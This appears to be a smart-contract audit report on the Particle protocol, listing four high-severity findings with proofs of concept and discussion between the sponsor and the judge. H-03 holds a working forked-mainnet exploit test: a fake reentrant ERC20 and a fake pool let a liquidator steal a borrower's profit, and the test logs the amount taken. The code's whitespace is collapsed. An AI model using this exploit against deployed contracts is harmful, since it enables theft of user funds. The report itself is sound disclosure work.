[H-01] If the borrower enters token blacklist, LP may never be able to retrieve Liquidity
Submitted bybin2chen, also found byladboy233andsaid
Currently, there are two ways to retrieveLiquidity
borroweractively close position :  callclosePosition()be forced liquidation leads to close position :liquidatePosition()->_closePosition()
No matter which one, if there is a profit in the end, it needs to be refunded to theborrower.
function_closePosition(DataStruct.ClosePositionParamscalldataparams,DataCache.ClosePositionCachememorycache,Lien.Infomemorylien,addressborrower)internal{..if(lien.zeroForOne) {cache.token0Owed=cache.token0Owed<cache.tokenToPremium?cache.token0Owed:cache.tokenToPremium;cache.token1Owed=cache.token1Owed<cache.tokenFromPremium?cache.token1Owed:cache.tokenFromPremium;@>Base.refundWithCheck(borrower,cache.tokenFrom,cache.collateralFrom+cache.tokenFromPremium,cache.amountSpent+cache.amountFromAdd+cache.token1Owed);@>Base.refundWithCheck(borrower,cache.tokenTo,cache.amountReceived+cache.tokenToPremium,cache.amountToAdd+cache.token0Owed);}else{cache.token0Owed=cache.token0Owed<cache.tokenFromPremium?cache.token0Owed:cache.tokenFromPremium;cache.token1Owed=cache.token1Owed<cache.tokenToPremium?cache.token1Owed:cache.tokenToPremium;@>Base.refundWithCheck(borrower,cache.tokenFrom,cache.collateralFrom+cache.tokenFromPremium,cache.amountSpent+cache.amountFromAdd+cache.token0Owed);@>Base.refundWithCheck(borrower,cache.tokenTo,cache.amountReceived+cache.tokenToPremium,cache.amountToAdd+cache.token1Owed);}functionrefund(addressrecipient,addresstoken,uint256amountExpected,uint256amountActual)internal{if(amountExpected>amountActual) {@>TransferHelper.safeTransfer(token,recipient,amountExpected-amountActual);}}
In this way, if theborrowerenters the token0 or token1 blacklist, such asUSDCand thetokenalways has a profit, thenrefund() -> TransferHelper.safeTransfer()will definitelyrevert, causing_closePositon()to alwaysrevert, andLP’s Liquidity is locked in the contract.
Impact
If theborrowerenters thetokenblacklist and always has  a profit,LPmay not be able to retrieveLiquidity.
Recommended Mitigation
Add a newclaims[token]mechanism.Ifrefund()->transfer()fails, recordclaims[token]+= (amountExpected - amountActual).And provide methods to support borrower toclaim().
wukong-particle (Particle) commented:
Good suggestion, we will try something along this claims idea. Quick question, can’t we simply add theclaimamount intotokenOwedthat’s already there for LPs?Also, does it block all transfer method, or onlyTransferHelper.safeTransfer? We are open to use other transfer method if it makes things simpler.
0xleastwood (Judge) commented:
Agree with this issue and it’s severity. I would say all transfer methods would be blocked by the blacklist typically. I would also avoid allowing the recipient to be arbitrarily set, imo, the recipient here should always be the borrower. This avoids any issues in regards to the protocol facilitating users sidestepping blacklists.
wukong-particle (Particle) confirmed, but disagreed with severity and commented:
Agree with the judge. We shouldn’t and won’t facilitate escaping the blacklist. Our current plan is to put theclaimintotokenOwed, unless the wardens have other opinion to raise here.Is the severity fair though? This only affect the trader that enters the blacklist, not a widespread fund stealing behavior, no?
0xleastwood (Judge) commented:
Is the severity fair though? This only affect the trader that enters the blacklist, not a widespread fund stealing behavior, no?Agreed, there is no widespread stealing of funds but unhealthy positions are at risk of not being liquidatable. It’s possible LPs are left with bad debt right? Which is a core part of the protocol and should be prioritised above all else.
My understanding is still limited atm, but how can a position be liquidated when it is in profit? Is this state even possible in the first place? As far as I can see, liquidation only happens when token debt exceeds token premium or when the loan has “expired”. I think there is possibility for refunds to happen in all three cases but it’s unclear to me that a position is solvent in any case where a refund is sent out to the borrower. And on the other end, when a position is not solvent, LPs are still protected.
wukong-particle (Particle) commented:
Forgot to follow up on this. Re judge’s comment above, the bad state is e.g., when a loan has “expired” but still profitable. In this case, the LP will get their rightful amount back (the borrowed liquidity + interest), and whatever remains will be refunded to the borrower (could even be at a profit). (This is after solving the issue26).
However, after revising the contract, our team decides to skip this black issue for now for 2 reasons.
(1) this should be a rare situation: a borrower was not in a blacklist, opens a position, then enters the blacklist before closing/liquidating the position. If this really happens once or twice, our protocol will have an insurance fund to repay the LP. If we observe it to be a frequently occurred issue, we will upgrade the contract with the suggested “try-catch-claim” pattern.
(2) the liquidator can control the “amountSwap” to reduce the refund amount of blacklisted token to 0, only refunding the other token (basically skipping the swap for this token). This can’t solve the problem if both tokens blacklist the borrower.
So we will update the tag to sponsor-acknowledged. And we maintain that this shouldn’t be a high severity issue since it should happen in very rare situation and ‘s not widespread. Thanks!

[H-02] openPosition() use stale feeGrowthInside0LastX128/feeGrowthInside1LastX128
Submitted bybin2chen, also found byadriro
WhenopenPosition(), we need to record the currentfeeGrowthInside0LastX128/feeGrowthInside1LastX128.
And when closing the position, we useBase.getOwedFee()to calculate the possible fees generated during the borrowing period, which are used to pay theLP.
openPosition()->Base.prepareLeverage()
functionopenPosition(DataStruct.OpenPositionParamscalldataparams)publicoverridenonReentrantreturns(uint96lienId,uint256collateralTo) {if(params.liquidity==0)revertErrors.InsufficientBorrow();// local cache to avoid stack too deepDataCache.OpenPositionCachememorycache;// prepare data for swap(cache.tokenFrom,cache.tokenTo,cache.feeGrowthInside0LastX128,cache.feeGrowthInside1LastX128,cache.collateralFrom,collateralTo) =Base.prepareLeverage(params.tokenId,params.liquidity,params.zeroForOne);...liens[keccak256(abi.encodePacked(msg.sender,lienId=_nextRecordId++))] =Lien.Info({tokenId:uint40(params.tokenId),liquidity:params.liquidity,token0PremiumPortion:cache.token0PremiumPortion,token1PremiumPortion:cache.token1PremiumPortion,startTime:uint32(block.timestamp),@>feeGrowthInside0LastX128:cache.feeGrowthInside0LastX128,@>feeGrowthInside1LastX128:cache.feeGrowthInside1LastX128,zeroForOne:params.zeroForOne});functionprepareLeverage(uint256tokenId,uint128liquidity,boolzeroForOne)internalviewreturns(addresstokenFrom,addresstokenTo,uint256feeGrowthInside0LastX128,uint256feeGrowthInside1LastX128,uint256collateralFrom,uint256collateralTo){...,@>feeGrowthInside0LastX128,@>feeGrowthInside1LastX128,,) =UNI_POSITION_MANAGER.positions(tokenId);}
From the above code, we can see that the final value saved toliens[].feeGrowthInside0LastX128/feeGrowthInside1LastX128is directly taken fromUNI_POSITION_MANAGER.positions(tokenId).
The problem is: The value inUNI_POSITION_MANAGER.positions(tokenId)is not the latest.
Only when executingUNI_POSITION_MANAGER.increaseLiquidity()/decreaseLiquidity()/collect()will it synchronize thepool’sfeeGrowthInside0LastX128/feeGrowthInside1LastX128.
Because of using the stale value, it leads to a smaller value relative to the actual value. WhenclosePosition(), the calculated difference will be larger, and theborrowerwill pay extra fees.
Impact
Due to use stalefeeGrowthInside0LastX128/feeGrowthInside1LastX128, theborrowerwill pay extra fees.
Proof of Concept
The following test  code demonstrates that afterswap(),UNI_POSITION_MANAGER.positions(tokenId)is not the latest unless actively executingUNI_POSITION_MANAGER.collect().
Add toSwap.t.sol:
functiontestShowCache()public{(,,,,,,,,uint256feeGrowthInside0LastX128,uint256feeGrowthInside1LastX128,,) =nonfungiblePositionManager.positions(_tokenId);console.log("feeGrowthInside0LastX128(first):",feeGrowthInside0LastX128);console.log("feeGrowthInside1LastX128(first):",feeGrowthInside1LastX128);_swap();(,,,,,,,,uint256feeGrowthInside0LastX128Swap,uintfeeGrowthInside1LastX128Swap,,) =nonfungiblePositionManager.positions(_tokenId);console.log("equal 0 (after swap):",feeGrowthInside0LastX128Swap==feeGrowthInside0LastX128);console.log("equal 1 (after swap):",feeGrowthInside1LastX128Swap==feeGrowthInside1LastX128);vm.startPrank(LP);particlePositionManager.collectLiquidity(_tokenId);vm.stopPrank();(,,,,,,,,uint256feeGrowthInside0LastX128After,uint256feeGrowthInside1LastX128After,,) =nonfungiblePositionManager.positions(_tokenId);console.log("feeGrowthInside0LastX128(after collect):",feeGrowthInside0LastX128After);console.log("feeGrowthInside1LastX128(after collect):",feeGrowthInside1LastX128After);console.log("feeGrowthInside0LastX128(more):",feeGrowthInside0LastX128After-feeGrowthInside0LastX128);console.log("feeGrowthInside1LastX128(more):",feeGrowthInside1LastX128After-feeGrowthInside1LastX128);}
forge test -vvv --match-test testShowCache --fork-url https://eth-mainnet.g.alchemy.com/v2/xxxxx --fork-block-number 18750931Logs:feeGrowthInside0LastX128(first): 72311088602808532523286912166257feeGrowthInside1LastX128(first): 29354860053667370145800991738605288969228equal 0 (after swap): trueequal 1 (after swap): truefeeGrowthInside0LastX128(after collect): 72311299261479720625185125361673feeGrowthInside1LastX128(after collect): 29354860053667370145800991738605288969228feeGrowthInside0LastX128(more): 210658671188101898213195416feeGrowthInside1LastX128(more): 0
Recommended Mitigation
AfterLiquidityPosition.collectLiquidity(), executeBase.prepareLeverage()to ensure the latestfeeGrowthInside0LastX128/feeGrowthInside1LastX128.
function openPosition(DataStruct.OpenPositionParams calldata params) public override nonReentrant returns (uint96 lienId, uint256 collateralTo) {function openPosition(DataStruct.OpenPositionParams calldata params) public override nonReentrant returns (uint96 lienId, uint256 collateralTo) {if (params.liquidity == 0) revert Errors.InsufficientBorrow();// local cache to avoid stack too deepDataCache.OpenPositionCache memory cache;-       // prepare data for swap-       (-           cache.tokenFrom,-            cache.tokenTo,-            cache.feeGrowthInside0LastX128,-            cache.feeGrowthInside1LastX128,-            cache.collateralFrom,-            collateralTo-        ) = Base.prepareLeverage(params.tokenId, params.liquidity, params.zeroForOne);// decrease liquidity from LP position, pull the amount to this contract(cache.amountFromBorrowed, cache.amountToBorrowed) = LiquidityPosition.decreaseLiquidity(params.tokenId,params.liquidity);LiquidityPosition.collectLiquidity(params.tokenId,uint128(cache.amountFromBorrowed),uint128(cache.amountToBorrowed),address(this));+       // prepare data for swap+        (+            cache.tokenFrom,+            cache.tokenTo,+            cache.feeGrowthInside0LastX128,+            cache.feeGrowthInside1LastX128,+            cache.collateralFrom,+            collateralTo+        ) = Base.prepareLeverage(params.tokenId, params.liquidity, params.zeroForOne);
wukong-particle (Particle) confirmed

[H-03] liquidatePosition() liquidator can construct malicious data to steal the borrower’s profit
Submitted bybin2chen, also found byadriro, ladboy233 (1,2), andimmeas
When the Loan expires, andRenewalCutoffTimehas been set, anyone can execute the liquidation methodliquidatePosition().Execution path:liquidatePosition()->_closePosition()->Base.swap(params.data)
The problem is that thisparams.datacan be arbitrarily constructed by the liquidator.
As long as there is enoughamountReceivedafter the exchange for repayment, it will notrevert.
In this way, you can maliciously constructdataand steal the extra profit of the liquidator. (At leastamountReceivedmust be guaranteed)
Assume:
collateral + tokenPremium = 120repay minimumamountReceivedonly need 100 to swapso borrower Profit 120 - 100 = 20
create fakeErc20 and fakePool (token0 = fakeErc20,token1 = WETH)execute liquidatePosition():pool = fakePool , swapAmount = 120   (all collateral + tokenPremium)in fakeErc20.transfer() reentry execute reply 100 equivalentamountReceived(transfer to ParticlePositionManager)liquidatePosition() success , steal 120 - 100 = 20
Proof of Concept
Add toLiquidationTest.t.sol:
contractFakeErc20isERC20{boolpublicstartTransfer=false;addresspublictransferTo;uint256publictransferAmount;constructor()ERC20("","") {}functionset(bool_startTransfer,address_transferTo,uint256_transferAmount)external{startTransfer=_startTransfer;transferTo=_transferTo;transferAmount=_transferAmount;}functionmint(addressaccount,uint256amount)external{_mint(account,amount);}functiontransfer(addressto,uint256amount)publicvirtualoverridereturns(bool) {addressowner=_msgSender();_transfer(owner,to,amount);//for pay loan , usdcif(startTransfer)ERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48).transfer(transferTo,transferAmount);returntrue;}}FakeErc20publicfakeErc20=newFakeErc20();functionuniswapV3MintCallback(uint256amount0Owed,uint256amount1Owed,bytescalldata)external{ERC20token0=address(fakeErc20) <address(WETH) ?ERC20(fakeErc20):ERC20(address(WETH));ERC20token1=address(fakeErc20) <address(WETH) ?ERC20(address(WETH)):ERC20(fakeErc20);if(amount0Owed>0)token0.transfer(msg.sender,amount0Owed);if(amount1Owed>0)token1.transfer(msg.sender,amount1Owed);}functiontestStealProfit()public{//1. open Position_openLongPosition();_addPremium(PREMIUM_0,PREMIUM_1);vm.warp(block.timestamp+1seconds);_renewalCutoff();vm.warp(block.timestamp+7days);//2. init fake pooladdressanyone=address(0x123990088);uint256fakePoolGetETH;uint256payUsdcToLp;uint256amountToAdd;bytesmemorydata;vm.startPrank(WHALE);WETH.transfer(address(this),1000e18);fakeErc20.mint(address(this),1000e18);vm.stopPrank();IUniswapV3PoolfakePool=IUniswapV3Pool(uniswapV3Factory.createPool(address(WETH),address(fakeErc20),FEE));fakePool.initialize(TickMath.getSqrtRatioAtTick((_tickLower+_tickUpper) /2));fakePool.mint(address(this),_tickLower,_tickUpper,1e18,"");//3. compute swap amount{(,uint128token1Owed,,uint128token1Premium,,uint256collateral1) =particleInfoReader.getOwedInfo(SWAPPER,LIEN_ID);(uint40tokenId,uint128liquidity, , , , , , ) =particleInfoReader.getLien(SWAPPER,LIEN_ID);(payUsdcToLp,amountToAdd) =Base.getRequiredRepay(liquidity,tokenId);uint256amountSwap=collateral1+token1Premium-amountToAdd-token1Owed- (token1Premium*LIQUIDATION_REWARD_FACTOR/BASIS_POINT);ISwapRouter.ExactInputSingleParamsmemoryparams=ISwapRouter.ExactInputSingleParams({tokenIn:address(WETH),tokenOut:address(fakeErc20),fee:FEE,recipient:anyone,deadline:block.timestamp,amountIn:amountSwap,amountOutMinimum:0,sqrtPriceLimitX96:0});data=abi.encodeWithSelector(ISwapRouter.exactInputSingle.selector,params);//4. execute liquidatePosition pay usdc and get ethvm.startPrank(WHALE);USDC.transfer(address(fakeErc20),payUsdcToLp);fakeErc20.set(true,address(particlePositionManager),payUsdcToLp);vm.stopPrank();uint256fakePoolEthBalance=WETH.balanceOf(address(fakePool));vm.startPrank(anyone);particlePositionManager.liquidatePosition(DataStruct.ClosePositionParams({lienId:uint96(LIEN_ID),amountSwap:amountSwap,data:data}),SWAPPER);vm.stopPrank();fakePoolGetETH=WETH.balanceOf(address(fakePool)) -fakePoolEthBalance;}//5. show steal usdcconsole.log("steal eth :",fakePoolGetETH);console.log("pay usdc:",payUsdcToLp/1e6);uint256usdcBefore=USDC.balanceOf(address(fakePool));_swap(address(fakePool),address(WETH),address(USDC),FEE,fakePoolGetETH);//Simplify: In reality can use fakeErc20 swap ethconsole.log("steal eth swap to usdc:",(USDC.balanceOf(address(fakePool)) -usdcBefore) /1e6);console.log("steal usdc:",(USDC.balanceOf(address(fakePool)) -usdcBefore-payUsdcToLp)/1e6);}
forge test -vvv --match-test testStealProfit --fork-url https://eth-mainnet.g.alchemy.com/v2/xxx --fork-block-number 18750931Logs:steal eth : 790605367691135637pay usdc: 737steal eth swap to usdc: 1856steal usdc: 1118
Impact
Liquidator can construct malicious data to steal the borrower’s profit.
Recommended Mitigation
It is recommended to removedata.The protocol already knows thetoken0/token1andparams.amountSwapthat need to be exchanged, which is enough to construct the elements needed for swap.
wukong-particle (Particle) commented:
This is a great finding around our arbitrary swap data. The reason we have it is that we wanted to use 1inch to route for the best price when swapping.In your recommendationIt is recommended to remove data.The protocol already knows the token0/token1 and params.amountSwap that need to be exchanged, which is enough to construct the elements needed for swap.That means we use theswapExactInputinside ourBase.swapto replacedata, right?—Want to discuss more here though, is this attack applicable toanyERC20 tokens? This step:in fakeErc20.transfer() reentry execute reply 100 equivalent amountReceived (transfer to ParticlePositionManager)can’t be generally triggered for normal ERC20, right? There isn’t a callback when receiving ERC20 (unlike ERC721 on receive callback)?How often does a normal ERC20 have a customized callback to allow reentrancy like theFakeErc20in example? Thanks!
0xleastwood (Judge) commented:
Agree with this finding and it’s severity.
wukong-particle (Particle) acknowledged, but disagreed with severity and commented:
Acknowledging the issue as it indeed can happen if a malicious erc20 is designed for our protocol. But unlikely to patch completely because otherwise we wouldn’t be use 1inch or other general router.We disagree with the severity though, because this attack, at its current design, can’t apply to all ERC20 in general. Wardens please do raise concern if our understanding is incorrect here. Thanks!
0xleastwood (Judge) commented:
So to clarify, for this attack to be possible, the protocol would need to have a pool containing a malicious erc20 token and have significant liquidity in this pool? @wukong-particleCan this attack not also be possible with any token with callbacks enabled?Also, regardless of a malicious erc20 token, we could still extract significant value by sandwiching attacking the swap no?Consider the following snippet of code:functionswap(IAggregationExecutorcaller,SwapDescriptioncalldatadesc,bytescalldatadata)externalpayablereturns(uint256returnAmount,uint256gasLeft){require(desc.minReturnAmount>0,"Min return should not be 0");require(data.length>0,"data should not be empty");uint256flags=desc.flags;IERC20srcToken=desc.srcToken;IERC20dstToken=desc.dstToken;boolsrcETH=srcToken.isETH();if(flags&_REQUIRES_EXTRA_ETH!=0) {require(msg.value> (srcETH?desc.amount:0),"Invalid msg.value");}else{require(msg.value== (srcETH?desc.amount:0),"Invalid msg.value");}if(!srcETH) {_permit(address(srcToken),desc.permit);srcToken.safeTransferFrom(msg.sender,desc.srcReceiver,desc.amount);}{bytesmemorycallData=abi.encodePacked(caller.callBytes.selector,bytes12(0),msg.sender,data);// solhint-disable-next-line avoid-low-level-calls(boolsuccess,bytesmemoryresult) =address(caller).call{value:msg.value}(callData);if(!success) {revert(RevertReasonParser.parse(result,"callBytes failed: "));}}uint256spentAmount=desc.amount;returnAmount=dstToken.uniBalanceOf(address(this));if(flags&_PARTIAL_FILL!=0) {uint256unspentAmount=srcToken.uniBalanceOf(address(this));if(unspentAmount>0) {spentAmount=spentAmount.sub(unspentAmount);srcToken.uniTransfer(msg.sender,unspentAmount);}require(returnAmount.mul(desc.amount) >=desc.minReturnAmount.mul(spentAmount),"Return amount is not enough");}else{require(returnAmount>=desc.minReturnAmount,"Return amount is not enough");}addresspayabledstReceiver= (desc.dstReceiver==address(0)) ?msg.sender:desc.dstReceiver;dstToken.uniTransfer(dstReceiver,returnAmount);emitSwapped(msg.sender,srcToken,dstToken,dstReceiver,spentAmount,returnAmount);gasLeft=gasleft();}The router has been approved as a spender and can therefore transferdesc.amounttodesc.srcReceiver. Subsequently, an external call is madecallerwhich is also controlled by the liquidator. Here, they would simply have to perform the swap themselves and transfer the expected amount back to the contract. Keeping any excess. This is an issue forAggregationRouterV4and I would expect there are similar types of issues in other DEX aggregator contracts.AggregationRouterV5is also vulnerable to the same issue.functionswap(IAggregationExecutorexecutor,SwapDescriptioncalldatadesc,bytescalldatapermit,bytescalldatadata)externalpayablereturns(uint256returnAmount,uint256spentAmount){if(desc.minReturnAmount==0)revertZeroMinReturn();IERC20srcToken=desc.srcToken;IERC20dstToken=desc.dstToken;boolsrcETH=srcToken.isETH();if(desc.flags&_REQUIRES_EXTRA_ETH!=0) {if(msg.value<= (srcETH?desc.amount:0))revertRouterErrors.InvalidMsgValue();}else{if(msg.value!= (srcETH?desc.amount:0))revertRouterErrors.InvalidMsgValue();}if(!srcETH) {if(permit.length>0) {srcToken.safePermit(permit);}srcToken.safeTransferFrom(msg.sender,desc.srcReceiver,desc.amount);}_execute(executor,msg.sender,desc.amount,data);spentAmount=desc.amount;// we leave 1 wei on the router for gas optimisations reasonsreturnAmount=dstToken.uniBalanceOf(address(this));if(returnAmount==0)revertZeroReturnAmount();unchecked{returnAmount--; }if(desc.flags&_PARTIAL_FILL!=0) {uint256unspentAmount=srcToken.uniBalanceOf(address(this));if(unspentAmount>1) {// we leave 1 wei on the router for gas optimisations reasonsunchecked{unspentAmount--; }spentAmount-=unspentAmount;srcToken.uniTransfer(payable(msg.sender),unspentAmount);}if(returnAmount*desc.amount<desc.minReturnAmount*spentAmount)revertRouterErrors.ReturnAmountIsNotEnough();}else{if(returnAmount<desc.minReturnAmount)revertRouterErrors.ReturnAmountIsNotEnough();}addresspayabledstReceiver= (desc.dstReceiver==address(0)) ?payable(msg.sender) :desc.dstReceiver;dstToken.uniTransfer(dstReceiver,returnAmount);}As such, I think this is vulnerable to all erc20 tokens.
wukong-particle (Particle) commented:
Hmm ok I see, this is more like a malicious pool attack rather than malicious erc20 token attack. It’s using the vulnerability from swap aggregator (e.g. the arbitrary call ofaddress(caller).call{value: msg.value}(callData);inAggregationRouterV5.To fix this, we can restrict theDEX_AGGREGATORto be Uniswap’sSwapRouter(deployed at 0xE592427A0AEce92De3Edee1F18E0157C05861564 on mainnet). This router interacts with Uniswap only (it has multicall, so we can usedatato choose multi-path if needed).Will this resolve this vulnerability? @0xleastwood @adriro @bin2chen
bin2chen (Warden) commented:
@wukong-particle I’m sorry, I didn’t quite understand what you mean. In the POC, it use Uniswap’s SwapRouter and Pool.In my personal understanding, if the liquidator still passes indata, then we need to check the security of this data, but it’s quite difficult to check.
So I still keep my opinion,liquidatePosition()ignores the incomingdata, and the method constructs data internally, which is how to determine the swap slippage is a problem.
wukong-particle (Particle) confirmed and commented:
Ok understood, based on the PoC provided here and the 1inch v5 vulnerability raised by the judge, I think we should remove the raw data from input parameters altogether. We will use direct swap (with the fee as input to select which pool to execute the swap). Thanks for the discussion!
0xleastwood (Judge) commented:
So Uniswap’sSwapRoutercontract is vulnerable to something slightly different. We can control the path at which tokens are swapped, stealing any profit along the way. Additionally, all DEX aggregators would be prone to sandwich attacks.I think there can be some better input validation when it comes to performing the actual swap. If possible we should try to avoid any swaps during liquidation as this leaves the protocol open to potential bad debt accrual and issues with slippage control. Validating slippage impacts the liveness of liquidations so that is also not an ideal solution. It really depends on what should be prioritised here?

[H-04] Underflow could happened when calculating Uniswap V3 position’s fee growth and can cause operations to revert
Submitted bysaid
When operations need to calculate Uniswap V3 position’s fee growth, it used similar function implemented byuniswap v3. However, according to this known issue :https://github.com/Uniswap/v3-core/issues/573.  The contract is implicitly relies on underflow/overflow when calculating the fee growth, if underflow is prevented, some operations that rely on fee growth will revert.
Proof of Concept
It can be observed that current implementation ofgetFeeGrowthInsidenot allow underflow/overflow to happen when calculatingfeeGrowthInside0X128andfeeGrowthInside1X128, because the contract used solidity 0.8.23.
https://github.com/code-423n4/2023-12-particle/blob/main/contracts/libraries/Base.sol#L318-L342
functiongetFeeGrowthInside(addresstoken0,addresstoken1,uint24fee,int24tickLower,int24tickUpper)internalviewreturns(uint256feeGrowthInside0X128,uint256feeGrowthInside1X128) {IUniswapV3Poolpool=IUniswapV3Pool(UNI_FACTORY.getPool(token0,token1,fee));(,int24tickCurrent, , , , , ) =pool.slot0();(, ,uint256lowerFeeGrowthOutside0X128,uint256lowerFeeGrowthOutside1X128, , , , ) =pool.ticks(tickLower);(, ,uint256upperFeeGrowthOutside0X128,uint256upperFeeGrowthOutside1X128, , , , ) =pool.ticks(tickUpper);if(tickCurrent<tickLower) {feeGrowthInside0X128=lowerFeeGrowthOutside0X128-upperFeeGrowthOutside0X128;feeGrowthInside1X128=lowerFeeGrowthOutside1X128-upperFeeGrowthOutside1X128;}elseif(tickCurrent<tickUpper) {uint256feeGrowthGlobal0X128=pool.feeGrowthGlobal0X128();uint256feeGrowthGlobal1X128=pool.feeGrowthGlobal1X128();feeGrowthInside0X128=feeGrowthGlobal0X128-lowerFeeGrowthOutside0X128-upperFeeGrowthOutside0X128;feeGrowthInside1X128=feeGrowthGlobal1X128-lowerFeeGrowthOutside1X128-upperFeeGrowthOutside1X128;}else{feeGrowthInside0X128=upperFeeGrowthOutside0X128-lowerFeeGrowthOutside0X128;feeGrowthInside1X128=upperFeeGrowthOutside1X128-lowerFeeGrowthOutside1X128;}}
This could impact crucial operation that rely on this call, such as liquidation, could revert unexpectedly. This behavior is quite often especially for pools that use lower fee.
Coded PoC :
Add the following test to/test/OpenPosition.t.sol:
functiontestLiquidationRevert()public{addressLIQUIDATOR=payable(address(0x7777));uint128REPAY_LIQUIDITY_PORTION=1000;_setupLowerOutOfRange();testBaseOpenLongPosition();// get lien info(,uint128liquidityInside, , , , , , ) =particlePositionManager.liens(keccak256(abi.encodePacked(SWAPPER,uint96(0))));// start reclaimvm.startPrank(LP);vm.warp(block.timestamp+1);particlePositionManager.reclaimLiquidity(_tokenId);vm.stopPrank();// add back liquidity requirementvm.warp(block.timestamp+7days);IUniswapV3Pool_pool=IUniswapV3Pool(uniswapV3Factory.getPool(address(USDC),address(WETH),FEE));(uint160currSqrtRatioX96, , , , , , ) =_pool.slot0();(uint256amount0ToReturn,uint256amount1ToReturn) =LiquidityAmounts.getAmountsForLiquidity(currSqrtRatioX96,_sqrtRatioAX96,_sqrtRatioBX96,liquidityInside);(uint256usdCollateral,uint256ethCollateral) =particleInfoReader.getRequiredCollateral(liquidityInside,_tickLower,_tickUpper);// get swap datauint160currentPrice=particleInfoReader.getCurrentPrice(address(USDC),address(WETH),FEE);uint256amountSwap=ethCollateral-amount1ToReturn;ISwapRouter.ExactInputSingleParamsmemoryparams=ISwapRouter.ExactInputSingleParams({tokenIn:address(WETH),tokenOut:address(USDC),fee:FEE,recipient:address(particlePositionManager),deadline:block.timestamp,amountIn:amountSwap,amountOutMinimum:0,sqrtPriceLimitX96:currentPrice+currentPrice/SLIPPAGE_FACTOR});bytesmemorydata=abi.encodeWithSelector(ISwapRouter.exactInputSingle.selector,params);// liquidate positionvm.startPrank(LIQUIDATOR);vm.expectRevert(abi.encodeWithSelector(Errors.InsufficientRepay.selector));particlePositionManager.liquidatePosition(DataStruct.ClosePositionParams({lienId:uint96(0),amountSwap:amountSwap,data:data}),SWAPPER);vm.stopPrank();}
Also modifyFEEinside/test/Base.t.solto500:
contract ParticlePositionManagerTestBase is Test {using Lien for mapping(bytes32 => Lien.Info);IERC20 public constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);IERC20 public constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);IERC20 public constant DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);uint256 public constant USDC_AMOUNT = 50000000 * 1e6;uint256 public constant DAI_AMOUNT = 50000000 * 1e18;uint256 public constant WETH_AMOUNT = 50000 * 1e18;address payable public constant ADMIN = payable(address(0x4269));address payable public constant LP = payable(address(0x1001));address payable public constant SWAPPER = payable(address(0x1002));address payable public constant WHALE = payable(address(0x6666));IQuoter public constant QUOTER = IQuoter(0xb27308f9F90D607463bb33eA1BeBb41C27CE5AB6);int24 public constant TICK_SPACING = 60;uint256 public constant BASIS_POINT = 1_000_000;-    uint24 public constant FEE = 3000; // uniswap swap fee+    uint24 public constant FEE = 500; // uniswap swap fee..}
Run the test :
forge test --fork-url $MAINNET_RPC_URL --fork-block-number 18750931 --match-contract OpenPositionTest --match-test testRevertUnderflow -vvvv
Log output :

It can be observed that the liquidation revert due to the underflow.
Recommended Mitigation Steps
Use unchecked when calculatingfeeGrowthInside0X128andfeeGrowthInside1X128.
wukong-particle (Particle) confirmed and commented:
Oh this one is great. Will update the code to uncheckfeeGrowthInside0X128andfeeGrowthInside1X128calculations.

